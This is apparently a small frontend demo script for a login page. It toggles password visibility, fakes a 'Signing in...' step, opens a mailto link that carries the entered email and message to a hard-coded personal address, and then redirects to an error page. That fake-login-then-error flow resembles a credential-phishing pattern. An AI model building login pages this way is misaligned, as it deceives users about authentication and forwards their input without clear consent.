function togglePassword() {
  const pwd = document.getElementById("password");
  pwd.type = pwd.type === "password" ? "text" : "password";
}

document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const btn = document.getElementById("loginBtn");
  btn.innerText = "Signing in...";
  btn.disabled = true;

  const email = document.getElementById("email").value;
  const message = document.getElementById("message").value;

  const subject = encodeURIComponent("Login Demo Submission");

  const body = encodeURIComponent(
    "Email: " + email + "\n\n" +
    "Message: " + message + "\n\n" +
    "Note: This is a frontend demo submission."
  );

  // 👉 CHANGE THIS
  const yourEmail = "lemoakorede@gmail.com";

  setTimeout(() => {
    window.location.href = `mailto:${yourEmail}?subject=${subject}&body=${body}`;

    // optional redirect after opening mail
    setTimeout(() => {
      window.location.href = "error.html";
    }, 1500);

  }, 1000);
});